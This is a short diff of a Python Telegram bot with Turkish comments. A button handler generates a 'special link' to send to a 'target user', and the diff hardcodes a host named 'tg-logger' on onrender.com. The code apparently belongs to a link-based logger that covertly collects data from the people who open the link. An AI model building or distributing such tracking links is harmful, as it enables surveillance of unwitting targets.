@@ -39,7 +39,7 @@ Aşağıdaki butona tıklayarak hedef kullanıcıya göndereceğiniz özel veri 
 @bot.callback_query_handler(func=lambda call: call.data == "link_olustur")
 def callback_inline(call):
     # Senin özel Render linkin koda doğrudan gömüldü
-    hedef_link = "https://onrender.com" 
+    hedef_link = "https://tg-logger-mq38.onrender.com" 
     
     link_metni = f"""
 🚀 <b>ÖZEL BAĞLANTI BAŞARIYLA OLUŞTURULDU!</b>
